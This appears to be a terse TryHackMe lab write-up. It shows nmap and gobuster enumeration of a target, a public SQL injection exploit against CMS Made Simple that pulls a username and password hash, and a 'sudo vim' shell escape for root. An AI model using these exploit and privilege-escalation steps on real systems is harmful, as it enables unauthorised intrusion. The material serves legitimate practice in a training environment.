#TryHackMe #linux 
# Enum
## nmap
┌──(root㉿kali)-[~]
└─# nmap -sC -sV ctf
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.2.28.175
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 294269149ecad917988c27723acda923 (RSA)
|   256 9bd165075108006198de95ed3ae3811c (ECDSA)
|_  256 12651b61cf4de575fef4e8d46e102af6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


## gobuster 
┌──(root㉿kali)-[~]
└─# gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://ctf/ -x php,html,txt
	/index.html           (Status: 200) [Size: 11321]
	/robots.txt           (Status: 200) [Size: 929]
	/server-status        (Status: 403) [Size: 291]
	/simple               (Status: 301) [Size: 295] [--> http://ctf/simple/]

┌──(root㉿kali)-[~]
└─# gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://ctf/simple/ -x php,html,txt
	/admin                (Status: 301) [Size: 301] [--> http://ctf/simple/admin/]
	/assets               (Status: 301) [Size: 302] [--> http://ctf/simple/assets/]
	/config.php           (Status: 200) [Size: 0]
	/doc                  (Status: 301) [Size: 299] [--> http://ctf/simple/doc/]
	/index.php            (Status: 200) [Size: 19193]
	/index.php            (Status: 200) [Size: 19193]
	/install.php          (Status: 301) [Size: 0] [--> /simple/install.php/index.php]
	/lib                  (Status: 301) [Size: 299] [--> http://ctf/simple/lib/]
	/modules              (Status: 301) [Size: 303] [--> http://ctf/simple/modules/]
	/tmp                  (Status: 301) [Size: 299] [--> http://ctf/simple/tmp/]
	/uploads              (Status: 301) [Size: 303] [--> http://ctf/simple/uploads/]

# Find 
## in  http://ctf/simple/ 
┌──(root㉿kali)-[~]
└─# searchsploit CMS Made Simple 2.2.8
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                   | php/webapps/46635.py


# Exploit
┌──(root㉿kali)-[~]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/46635.py -u http://ctf/simple/ -w /usr/share/wordlists/rockyou.txt
	[+] Salt for password found: 1dac0d92e9fa6bb2@
	[+] Username found: mitch
	[+] Email found: admin@admin.com
	[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96


# PrivEsc
```
sudo vim -c ':!/bin/sh'
```

